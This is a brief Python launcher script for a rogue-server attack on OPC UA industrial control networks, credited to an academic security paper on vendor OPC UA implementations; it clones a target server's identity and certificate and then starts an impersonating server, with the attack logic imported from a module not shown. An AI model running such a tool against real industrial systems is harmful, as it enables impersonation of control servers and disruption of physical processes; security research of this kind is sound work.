#!/usr/bin/env -S sudo -E -S python3

import argparse
import time

from rogueserver.rogue_server import (
    copy_server_info_and_clone_certificate,
    start_rogue_server,
)

if __name__ == "__main__":
    """
    Original creators of the code: Alessandro Erba, Anne Müller, Nils Ole Tippenhauer
    Paper: Security Analysis of Vendor Implementations of the OPC UA Protocol for Industrial Control Systems
    DOI: 10.1145/3560826.3563380
    """
    parser = argparse.ArgumentParser(
        description="A tool to implemnt rogue server attacks on OPC UA networks"
    )
    parser.add_argument(
        "-p",
        "--port",
        default="4840",
        type=str,
        help="Port to use for the attack (default: 4840)",
    )
    parser.add_argument(
        "-t", "--target", required=True, type=str, help="Target server address"
    )

    args = parser.parse_args()

    server_info = copy_server_info_and_clone_certificate(args.target, args.port)
    start_rogue_server(server_info)
    while True:
        time.sleep(100)
